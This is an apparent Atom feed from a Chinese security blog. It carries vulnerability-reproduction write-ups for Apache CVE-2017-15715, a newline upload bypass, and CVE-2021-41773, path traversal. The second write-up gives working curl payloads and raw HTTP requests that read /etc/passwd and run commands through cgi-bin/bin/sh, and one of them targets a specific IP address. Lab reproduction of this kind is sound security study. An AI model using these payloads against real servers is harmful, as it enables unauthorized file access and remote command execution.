<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Taoing&#39;s Blog</title>
  
  <subtitle>技术永无止境</subtitle>
  <link href="http://ta0ing.github.io/atom.xml" rel="self"/>
  
  <link href="http://ta0ing.github.io/"/>
  <updated>2021-10-09T07:42:51.318Z</updated>
  <id>http://ta0ing.github.io/</id>
  
  <author>
    <name>Taoing</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>apache httpd多后缀解析漏洞复现</title>
    <link href="http://ta0ing.github.io/2021/10/09/apache-httpd%E5%A4%9A%E5%90%8E%E7%BC%80%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://ta0ing.github.io/2021/10/09/apache-httpd%E5%A4%9A%E5%90%8E%E7%BC%80%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-10-09T07:42:13.000Z</published>
    <updated>2021-10-09T07:42:51.318Z</updated>
    
    
    
    
    <category term="文章分类，本主题的分类表示宏观上大的分类，只建议一篇文章一个分类。例如漏洞复现" scheme="http://ta0ing.github.io/categories/%E6%96%87%E7%AB%A0%E5%88%86%E7%B1%BB%EF%BC%8C%E6%9C%AC%E4%B8%BB%E9%A2%98%E7%9A%84%E5%88%86%E7%B1%BB%E8%A1%A8%E7%A4%BA%E5%AE%8F%E8%A7%82%E4%B8%8A%E5%A4%A7%E7%9A%84%E5%88%86%E7%B1%BB%EF%BC%8C%E5%8F%AA%E5%BB%BA%E8%AE%AE%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E4%B8%80%E4%B8%AA%E5%88%86%E7%B1%BB%E3%80%82%E4%BE%8B%E5%A6%82%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="Apache" scheme="http://ta0ing.github.io/tags/Apache/"/>
    
  </entry>
  
  <entry>
    <title>apache 解析漏洞（CVE-2017-15715)</title>
    <link href="http://ta0ing.github.io/2021/10/09/apache-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-15715/"/>
    <id>http://ta0ing.github.io/2021/10/09/apache-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-15715/</id>
    <published>2021-10-09T07:38:38.000Z</published>
    <updated>2021-10-09T07:41:34.981Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CVE-2017-15715"><a href="#CVE-2017-15715" class="headerlink" title="CVE-2017-15715"></a>CVE-2017-15715</h2><h3 id="一、漏洞描述"><a href="#一、漏洞描述" class="headerlink" title="一、漏洞描述"></a>一、漏洞描述</h3><p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p><h3 id="二、环境搭建"><a href="#二、环境搭建" class="headerlink" title="二、环境搭建"></a>二、环境搭建</h3><p>使用Vulhub</p><h3 id="三、漏洞复现"><a href="#三、漏洞复现" class="headerlink" title="三、漏洞复现"></a>三、漏洞复现</h3><p>上传一个名为six.php的文件，被拦截：<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606482_20200907160230876_29113.png" alt="img"><br><strong>在1.php后面插入一个\x0A（注意，不能是\x0D\x0A，只能是一个\x0A），不再拦截：</strong><br>修改后</p><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606482_20200908100228730_20905.png" alt="img"><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606482_20200908100418532_11097.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;CVE-2017-15715&quot;&gt;&lt;a href=&quot;#CVE-2017-15715&quot; class=&quot;headerlink&quot; title=&quot;CVE-2017-15715&quot;&gt;&lt;/a&gt;CVE-2017-15715&lt;/h2&gt;&lt;h3 id=&quot;一、漏洞描述&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    <category term="漏洞复现" scheme="http://ta0ing.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="Apache HTTPD" scheme="http://ta0ing.github.io/tags/Apache-HTTPD/"/>
    
    <category term="CVE-2017-15715" scheme="http://ta0ing.github.io/tags/CVE-2017-15715/"/>
    
  </entry>
  
  <entry>
    <title>Apache HTTP Server 2.4.49 路径穿越漏洞(CVE-2021-41773)</title>
    <link href="http://ta0ing.github.io/2021/10/09/Apache-HTTP-Server-2-4-49-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E-CVE-2021-41773/"/>
    <id>http://ta0ing.github.io/2021/10/09/Apache-HTTP-Server-2-4-49-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E-CVE-2021-41773/</id>
    <published>2021-10-09T07:10:40.000Z</published>
    <updated>2021-10-09T07:37:09.908Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Apache-HTTP-Server-2-4-49-路径穿越漏洞-CVE-2021-41773"><a href="#Apache-HTTP-Server-2-4-49-路径穿越漏洞-CVE-2021-41773" class="headerlink" title="Apache HTTP Server 2.4.49 路径穿越漏洞(CVE-2021-41773)"></a>Apache HTTP Server 2.4.49 路径穿越漏洞(CVE-2021-41773)</h2><h3 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h3><p>Apache HTTP Server是Apache基金会开源的一款流行的HTTP服务器。在其2.4.49版本中，引入了一个路径穿越漏洞，满足下面两个条件的Apache服务器将会受到影响：<br>版本等于2.4.49<br>穿越的目录允许被访问，比如配置了<Directory />Require all granted</Directory>。（默认情况下是不允许的）<br>攻击者利用这个漏洞，可以读取位于Apache服务器Web目录以外的其他文件，或者读取Web目录中的脚本文件源码，或者在开启了cgi或cgid的服务器上执行任意命令。</p><p><strong>参考链接：</strong></p><ul><li><a href="https://httpd.apache.org/security/vulnerabilities_24.html">https://httpd.apache.org/security/vulnerabilities_24.html</a></li><li><a href="https://twitter.com/ptswarm/status/1445376079548624899">https://twitter.com/ptswarm/status/1445376079548624899</a></li><li><a href="https://twitter.com/HackerGautam/status/1445412108863041544">https://twitter.com/HackerGautam/status/1445412108863041544</a></li><li><a href="https://twitter.com/snyff/status/1445565903161102344">https://twitter.com/snyff/status/1445565903161102344</a></li><li><a href="https://github.com/vulhub/vulhub/blob/master/httpd/CVE-2021-41773/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/httpd/CVE-2021-41773/README.zh-cn.md</a></li></ul><h3 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h3><p>使用如下CURL命令来发送Payload（注意其中的/icons/必须是一个存在且可访问的目录）：<br><code>curl -v --path-as-is http://your-ip:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</code></p><pre><code>GET //icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1Host: 106.55.147.147:8080User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0Accept: */*Accept-Language: zh-CN,en;q=0.5Accept-Encoding: gzip, deflateConnection: closePragma: no-cacheCache-Control: no-cache</code></pre><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/2871523259279.png"></p><p>在服务端开启了cgi或cgid这两个mod的情况下，这个路径穿越漏洞将可以执行任意命令：<br><code>curl -v --data &quot;echo;id&quot; &#39;http://your-ip:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh&#39;</code><br><code>curl -v --data &quot;echo;id&quot; -x 127.0.0.1:8080 &#39;http://106.55.147.147:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh&#39;</code><br>-x 代表代理</p><pre><code>POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1Host: Your ip:8080User-Agent: curl/7.64.1Accept: */*Content-Length: 7Content-Type: application/x-www-form-urlencodedConnection: closeecho;id</code></pre><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/198315816802.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Apache-HTTP-Server-2-4-49-路径穿越漏洞-CVE-2021-41773&quot;&gt;&lt;a href=&quot;#Apache-HTTP-Server-2-4-49-路径穿越漏洞-CVE-2021-41773&quot; class=&quot;headerlink&quot; title</summary>
      
    
    
    
    <category term="漏洞复现" scheme="http://ta0ing.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="Apache HTTPD" scheme="http://ta0ing.github.io/tags/Apache-HTTPD/"/>
    
    <category term="CVE-2021-41773" scheme="http://ta0ing.github.io/tags/CVE-2021-41773/"/>
    
  </entry>
  
</feed>
